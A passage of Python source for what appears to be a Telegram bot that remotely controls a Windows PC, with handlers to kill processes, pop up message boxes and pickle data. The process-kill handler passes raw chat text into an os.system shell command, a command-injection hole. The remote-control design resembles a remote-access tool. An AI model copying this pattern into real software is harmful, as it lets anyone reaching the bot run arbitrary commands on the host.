    bot.send_message(message.chat.id,'💀 Enter the *name* of the *process* you want to *kill*:',parse_mode = 'Markdown')
    bot.register_next_step_handler(message, kill_process)
def kill_process(message):
    bot.send_chat_action(message.chat.id, 'typing')
    
    if not os.system("taskkill /IM " + message.text + " -F"):
        bot.send_message(message.chat.id,f'💀🔪🩸 The {message.text} process is killed', parse_mode = 'Markdown')
    else:
        bot.send_message(message.chat.id,'⛔ Process not found',parse_mode = 'Markdown')



################################################################################* message box
@bot.message_handler(commands = ['msgbox'])
def msgbox(message):
    bot.send_message(message.chat.id, '📝 Enter the text that should be displayed on the screen')
    bot.register_next_step_handler(message, msgbox_process)
def msgbox_process(message):
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        MessageBox(None, message.text, 'PC TOOL', 0)
        bot.send_message(message.chat.id, f'📕 Message with text is *closed*')
    except:
        bot.send_message(message.chat.id, "⛔ *ERROR*", parse_mode = 'Markdown')



################################################################################* write to file
def writeToFile():
    path = os.path.abspath('./') + '\\data\\data.bin'
    
    file = open(path, 'wb')
    pickle.dump(data, file)
    file.close()


################################################################################ infinite polling
bot.polling(none_stop = True)